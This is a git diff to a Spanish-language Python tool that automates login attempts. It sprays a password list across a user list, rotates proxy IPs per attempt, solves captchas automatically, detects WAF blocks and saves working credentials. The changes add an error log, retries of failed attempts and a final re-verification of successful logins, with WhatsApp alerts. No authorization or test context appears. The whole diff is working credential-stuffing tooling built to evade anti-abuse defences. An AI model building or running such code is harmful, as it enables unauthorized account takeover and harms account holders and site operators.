@@ -32,6 +32,7 @@ ARCHIVO_USUARIOS = DATA_DIR / "usuarios.csv"
 ARCHIVO_CONTRASENAS = DATA_DIR / "contraseñas.csv"
 ARCHIVO_IP = DATA_DIR / "ip.txt"
 ARCHIVO_BLACKLIST = DATA_DIR / "ip_blacklist.json"
+ARCHIVO_ERRORES = DATA_DIR / "login_errores.csv"
 
 # Crear directorios necesarios
 LOGS_DIR.mkdir(parents=True, exist_ok=True)
@@ -149,12 +150,47 @@ def main():
     from main import get_proxy_config, generate_session_id
     from concurrent.futures import ThreadPoolExecutor, as_completed
 
-    def run_single_attempt(usuario, contrasena, procedencia):
-        # 1. Verificar si ya se logró éxito previamente para este usuario (independiente de procedencia)
-        with success_lock:
-            if usuario in successful_users:
-                return None  # Omitir clave restante al haber completado exitosamente
+    def write_error_to_csv(procedencia, usuario, contrasena, ip, error_msg):
+        """Escribe un registro persistente en login_errores.csv."""
+        with csv_write_lock:
+            file_exists = ARCHIVO_ERRORES.exists()
+            with open(ARCHIVO_ERRORES, "a", encoding="utf-8", newline="") as f:
+                writer = csv.writer(f)
+                if not file_exists:
+                    writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])
+                writer.writerow([datetime.now().isoformat(), procedencia, usuario, contrasena, ip, error_msg])
 
+    def remove_error_from_csv(usuario, contrasena):
+        """Elimina un registro de login_errores.csv si ya no aplica (éxito o incorrecto definitivo)."""
+        if not ARCHIVO_ERRORES.exists():
+            return
+        with csv_write_lock:
+            rows = []
+            with open(ARCHIVO_ERRORES, "r", encoding="utf-8") as f:
+                reader = csv.reader(f)
+                header = next(reader, None)
+                for r in reader:
+                    if r and len(r) >= 4:
+                        # Si coincide el usuario y la contraseña, lo removemos
+                        if r[2] == usuario and r[3] == contrasena:
+                            continue
+                    rows.append(r)
+            
+            with open(ARCHIVO_ERRORES, "w", encoding="utf-8", newline="") as f:
+                writer = csv.writer(f)
+                if header:
+                    writer.writerow(header)
+                writer.writerows(rows)
+
+    def run_single_attempt(usuario, contrasena, procedencia, is_final_verification=False):
+        # 1. Verificar si ya se logró éxito previamente para este usuario (independiente de procedencia)
+        # Excepto si estamos realizando la verificación final de falsos positivos
+        if not is_final_verification:
+            with success_lock:
+                if usuario in successful_users:
+                    return None  # Omitir clave restante al haber completado exitosamente
+
+        # Generar sesión IP rotativa
         session_id = generate_session_id()
         proxy_data = get_proxy_config(session_id=session_id)
         ip_label = proxy_data["ip"]
@@ -167,46 +203,74 @@ def main():
 
         logger.info(f"🔑 [Probando] {usuario} | Clave: {contrasena} | Proc: {procedencia} | IP: {ip_label}")
 
-        automation = LoginAutomation(screenshot_dir=str(SCREENSHOT_DIR), headless=headless)
+        # Intentos repetidos con la MISMA IP si falla el captcha
+        max_captcha_not_found_retries = 3
+        captcha_not_found_attempt = 0
+        lr = {}
+
+        while captcha_not_found_attempt < max_captcha_not_found_retries:
+            automation = LoginAutomation(screenshot_dir=str(SCREENSHOT_DIR), headless=headless)
+            try:
+                automation.start_browser(proxy_config=proxy_cfg)
+                lr = automation.attempt_login(
+                    usuario=usuario,
+                    contraseña=contrasena,
+                    procedencia=procedencia,
+                    captcha_resolver=captcha_res.resolve,
+                )
+                
+                err_desc = lr.get("error", "")
+
+                # Requisito 2: "No se encontró captcha, intentando continuar..." -> cerrar navegador y volver a intentar con la misma IP
+                if "No se encontró captcha" in err_desc or "No se pudo obtener la imagen base64 del captcha" in err_desc:
+                    captcha_not_found_attempt += 1
+                    logger.warning(f"⚠️ Reintentando tarea ({captcha_not_found_attempt}/{max_captcha_not_found_retries}) en la misma IP debido a captcha no encontrado...")
+                    try:
+                        automation.close_browser()
+                    except:
+                        pass
+                    time.sleep(1)
+                    continue
+                else:
+                    # Si cargó captcha o falló por otro error, rompemos el bucle de reintento en misma IP
+                    break
+            except Exception as e:
+                logger.error(f"Excepción en el intento de navegador: {e}")
+                break
+            finally:
+                try:
+                    automation.close_browser()
+                except:
+                    pass
+
         result = {
             "usuario": usuario,
             "contrasena": contrasena,
             "procedencia": procedencia,
             "ip": ip_label,
-            "exito": False,
-            "error": "",
-            "screenshot": "",
-            "waf_blocked": False
+            "exito": lr.get("exito", False),
+            "error": lr.get("error", ""),
+            "screenshot": lr.get("screenshot", ""),
+            "waf_blocked": lr.get("waf_blocked", False)
         }
 
-        try:
-            automation.start_browser(proxy_config=proxy_cfg)
-            lr = automation.attempt_login(
-                usuario=usuario,
-                contraseña=contrasena,
-                procedencia=procedencia,
-                captcha_resolver=captcha_res.resolve,
-            )
+        err_desc = result["error"]
 
-            result.update({
-                "exito": lr.get("exito", False),
-                "error": lr.get("error", ""),
-                "screenshot": lr.get("screenshot", ""),
-                "waf_blocked": lr.get("waf_blocked", False)
-            })
+        # Si el XPath de error de credenciales está presente en la web o se expone en el error, NO es correcto
+        is_wrong_credentials = (
+            "contraseña incorrecta" in err_desc.lower() or 
+            "incorrecto" in err_desc.lower() or 
+            "claimVerificationServerError" in err_desc or
+            "autenticación" in err_desc.lower()
+        )
 
-            err_desc = result["error"]
+        if result["exito"] and not is_wrong_credentials:
+            logger.info(f"✅ [ÉXITO] Acceso confirmado para {usuario} ({procedencia}) con clave {contrasena}")
+            
+            # Borrar de la lista de errores en caso de que ahora sea correcto
+            remove_error_from_csv(usuario, contrasena)
 
-            # Si el XPath de error de credenciales está presente en la web o se expone en el error, NO es correcto
-            is_wrong_credentials = (
-                "contraseña incorrecta" in err_desc.lower() or 
-                "incorrecto" in err_desc.lower() or 
-                "claimVerificationServerError" in err_desc or
-                "autenticación" in err_desc.lower()
-            )
-
-            if result["exito"] and not is_wrong_credentials:
-                logger.info(f"✅ [ÉXITO] Acceso confirmado para {usuario} ({procedencia}) con clave {contrasena}")
+            if not is_final_verification:
                 with success_lock:
                     successful_users.add(usuario)
                 
@@ -226,13 +290,19 @@ def main():
                         )
                     except Exception as wa_err:
                         logger.error(f"Error WhatsApp: {wa_err}")
+            return result
 
-            elif is_wrong_credentials:
-                logger.warning(f"❌ [INCORRECTO] {usuario} ({procedencia}) | Clave: {contrasena}")
+        elif is_wrong_credentials:
+            logger.warning(f"❌ [INCORRECTO] {usuario} ({procedencia}) | Clave: {contrasena}")
+            
+            # Borrar de la lista de errores en caso de que ahora sea incorrecto
+            remove_error_from_csv(usuario, contrasena)
+
+            if not is_final_verification:
                 with csv_write_lock:
                     save_to_csv(file_incorrecto, procedencia, usuario, contrasena, ip_label, err_desc)
                 
-                # Enviar notificación WhatsApp para credenciales incorrectas (no se pudo encontrar)
+                # Enviar notificación WhatsApp
                 if whatsapp_activo:
                     try:
                         notifier.notify_error(
@@ -244,27 +314,22 @@ def main():
                         )
                     except Exception as wa_err:
                         logger.error(f"Error WhatsApp al notificar incorrecto: {wa_err}")
-            else:
+            return result
+        else:
+            # Requisito 3: Errores persistentes (WAF, timeouts, problemas de red/carga) -> guardar en login_errores.csv
+            if not is_final_verification:
                 if result["waf_blocked"]:
                     logger.warning(f"⚠️ [WAF] Bloqueo detectado en IP {ip_label}")
                 else:
-                    logger.warning(f"⚠️ [OTRO ERROR] {usuario} -> {err_desc[:60]}")
+                    logger.warning(f"⚠️ [ERROR PERSISTENTE] {usuario} -> {err_desc[:60]}")
+                write_error_to_csv(procedencia, usuario, contrasena, ip_label, err_desc)
+            return result
 
-        except Exception as e:
-            logger.error(f"Error en hilo de ejecución: {e}")
-        finally:
-            try:
-                automation.close_browser()
-            except:
-                pass
-        return result
-
-    # Ejecutar secuencialmente por procedencia. Si son ambas, primero se corre Interno completo, y luego Externo.
+    # 1. BARRIDO PRINCIPAL DE CREDENCIALES
     for proc in selected_procedencias:
         logger.info(f"🚀 INICIANDO PRUEBAS PARA PROCEDENCIA: {proc.upper()}")
         
-        # Generar cola de tareas para esta procedencia específica
-        # El orden solicitado es: por cada contraseña, se prueban todos los usuarios
+        # El orden: por cada contraseña se prueban todos los usuarios
         task_queue = []
         for contrasena in contrasenas:
             for usuario in usuarios:
@@ -281,6 +346,87 @@ def main():
                     fut.result()
                 except Exception as e:
                     logger.error(f"Excepción en finalización de tarea: {e}")
+
+    # Requisito 4: Probar al final nuevamente esos con errores persistentes.
+    if ARCHIVO_ERRORES.exists():
+        logger.info("♻️ INICIANDO RE-VALIDACIÓN DE TAREAS REGISTRADAS EN LOGIN_ERRORES.CSV...")
+        error_tasks = []
+        try:
+            with open(ARCHIVO_ERRORES, "r", encoding="utf-8") as f:
+                reader = csv.reader(f)
+                next(reader, None)  # Omitir cabecera
+                for row in reader:
+                    if row and len(row) >= 5:
+                        # row: [fecha, procedencia, usuario, contrasena, ip, error]
+                        error_tasks.append((row[2], row[3], row[1]))
+        except Exception as e:
+            logger.error(f"Error leyendo login_errores.csv: {e}")
+
+        if error_tasks:
+            logger.info(f"Re-intentando {len(error_tasks)} tareas fallidas...")
+            with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix="ErrorRetry") as executor:
+                futures = [executor.submit(run_single_attempt, t[0], t[1], t[2]) for t in error_tasks]
+                for fut in as_completed(futures):
+                    try:
+                        fut.result()
+                    except Exception as e:
+                        logger.error(f"Excepción en reintento de error: {e}")
+
+    # Requisito 5: Al final volver a probar los login_exitoso para eliminar falsos positivos
+    successful_logins_to_verify = []
+    if file_correcto.exists():
+        try:
+            with open(file_correcto, "r", encoding="utf-8") as f:
+                reader = csv.reader(f)
+                next(reader, None)  # Omitir cabecera
+                for row in reader:
+                    if row and len(row) >= 4:
+                        # row: [fecha, procedencia, usuario, contrasena, ip, error_info]
+                        successful_logins_to_verify.append((row[2], row[3], row[1]))
+        except Exception as e:
+            logger.error(f"Error leyendo login_correcto.csv para verificación final: {e}")
+
+    if successful_logins_to_verify:
+        logger.info("🔍 INICIANDO DOBLE VERIFICACIÓN FINAL DE TODOS LOS LOGINS EXITOSOS...")
+        verified_ok = []
+        verified_fails = []
+
+        with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix="FinalVerify") as executor:
+            future_to_task = {
+                executor.submit(run_single_attempt, t[0], t[1], t[2], is_final_verification=True): t
+                for t in successful_logins_to_verify
+            }
+            for fut in as_completed(future_to_task):
+                task = future_to_task[fut]
+                try:
+                    res = fut.result()
+                    if res and res.get("exito") and not (
+                        "contraseña incorrecta" in res.get("error", "").lower() or
+                        "incorrecto" in res.get("error", "").lower() or
+                        "claimVerificationServerError" in res.get("error", "")
+                    ):
+                        verified_ok.append(task)
+                        logger.info(f"✅ VERIFICACIÓN DE ÉXITO CONFIRMADA: {task[0]}")
+                    else:
+                        verified_fails.append(task)
+                        logger.warning(f"🚨 FALSO POSITIVO DETECTADO EN VERIFICACIÓN FINAL: {task[0]} | Error: {res.get('error') if res else 'N/A'}")
+                except Exception as e:
+                    logger.error(f"Error verificando {task[0]}: {e}")
+
+        # Limpiar y re-escribir login_correcto.csv removiendo falsos positivos detectados
+        if verified_fails:
+            logger.info(f"Removiendo {len(verified_fails)} falsos positivos de login_correcto.csv...")
+            with csv_write_lock:
+                # Escribir los fallos reales a login_incorrecto y remover de correcto
+                for f_task in verified_fails:
+                    save_to_csv(file_incorrecto, f_task[2], f_task[0], f_task[1], "verificacion_final", "Falso positivo confirmado")
+                
+                # Sobrescribir correcto solo con los realmente confirmados
+                with open(file_correcto, "w", encoding="utf-8", newline="") as f:
+                    writer = csv.writer(f)
+                    writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])
+                    for ok_task in verified_ok:
+                        writer.writerow([datetime.now().isoformat(), ok_task[2], ok_task[0], ok_task[1], "confirmado_verificacion", ""])
 
     # Detener bridge
     if whatsapp_activo:
